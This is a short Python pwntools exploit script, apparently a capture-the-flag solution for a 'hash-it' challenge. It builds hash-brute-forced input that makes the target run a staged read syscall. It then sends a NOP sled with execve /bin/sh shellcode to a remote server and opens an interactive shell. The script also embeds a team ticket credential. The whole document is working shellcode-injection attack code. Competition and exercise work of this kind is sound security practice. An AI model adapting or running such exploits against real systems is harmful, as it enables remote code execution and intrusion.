from pwn import *
from time import sleep
import malduck

context.arch = "amd64"

def brute_hash(exp, htype):
    algo = [malduck.md5, malduck.sha1, malduck.sha256, malduck.sha512]
    for i in range(0, 0x10000):
        v = p16(i)
        h = algo[htype](v)[0]
        if h == exp:
            return v

shellcode = asm(
    '''
    xor rdi, rdi;
    mov rdx, 0x1000;
    mov rsi, rcx;
    syscall;
    '''
)

inp = b""
for i in range(len(shellcode)):
    inp += brute_hash(shellcode[i], i % 4)


#r = process("./hashit")
r = remote("hash-it-0-m7tt7b7whagjw.shellweplayaga.me", 31337)
r.sendlineafter(b"please: ", b"ticket{BowlinePoopdeck4756n22:9hBcdhzs-C6Pu5FqJcOZy3Lg8swLhDpj6GhOK23JKNzGxvK-}")

print(inp)
print(len(inp))

sleep(1)
r.send(p32(len(inp))[::-1])

sleep(1)
r.send(inp)

execve_shellcode = shellcode = b"\x90"*100 + asm(shellcraft.sh())
sleep(1)
r.send(execve_shellcode)

r.interactive()
